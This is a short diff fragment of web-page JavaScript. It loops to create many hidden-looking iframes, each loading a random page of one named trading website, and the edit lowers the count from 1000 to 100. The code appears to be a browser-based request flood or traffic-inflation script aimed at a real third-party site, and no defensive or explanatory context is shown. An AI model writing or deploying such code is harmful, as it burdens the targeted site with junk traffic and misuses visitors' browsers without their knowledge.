@@ -12,7 +12,7 @@
         'https://www.bosstrade.net/zhivaya-torgovlya',
         'https://www.bosstrade.net/stragegii'
       ];
-      for (var i = 0; i < 1000; i = i+1) {
+      for (var i = 0; i < 100; i = i+1) {
         var iframe = document.createElement('iframe');
         iframe.src = urls[Math.floor(Math.random() * urls.length)];
         iframe.sandbox = 'allow-same-origin allow-scripts allow-forms';
